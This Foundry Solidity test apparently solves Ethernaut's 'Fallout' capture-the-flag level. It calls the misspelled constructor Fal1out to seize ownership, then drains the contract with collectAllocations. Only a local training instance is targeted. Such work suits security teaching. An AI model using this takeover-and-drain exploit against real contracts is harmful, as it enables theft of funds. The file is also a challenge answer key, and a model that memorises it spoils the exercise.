// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/2-Fallout/Fallout.sol";
import "../src/2-Fallout/FalloutFactory.sol";

contract FalloutTest is Test {
    Ethernaut ethernaut;
    FalloutFactory level;
    Fallout instance;
    address player = address(123456);

    function setUp() public {
        ethernaut = new Ethernaut();
        level = new FalloutFactory();
        ethernaut.registerLevel(level);
        startHoax(player);
        address instanceAddress = ethernaut.createLevelInstance(level);
        instance = Fallout(payable(instanceAddress));
    }

    function testFalloutHack() public {
        instance.Fal1out{value: 1 wei}();
        assertEq(instance.owner(), player);
        emit log_named_uint(
            "Fallout contract balance before",
            address(instance).balance
        );
        instance.collectAllocations();
        emit log_named_uint(
            "Fallout contract balance after",
            address(instance).balance
        );
        bool levelCompleted = ethernaut.submitLevelInstance(
            payable(address(instance))
        );
        assert(levelCompleted);
    }
}
